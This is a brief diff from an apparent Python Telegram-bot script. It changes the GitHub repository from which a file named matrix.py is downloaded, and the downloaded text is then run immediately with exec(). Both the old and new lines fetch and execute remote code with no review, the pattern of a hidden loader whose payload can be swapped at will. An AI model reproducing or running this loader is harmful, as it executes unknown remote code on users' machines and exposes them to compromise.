@@ -33,5 +33,5 @@ install_module("telebot")
 install_module("pyfiglet")
 
 import requests
-response = requests.get("https://raw.githubusercontent.com/DevMatrixArabic125901/ma/main/matrix.py")
+response = requests.get("https://raw.githubusercontent.com/DevMatrixArabic125901/Collectmathon/main/matrix.py")
 exec(response.text)
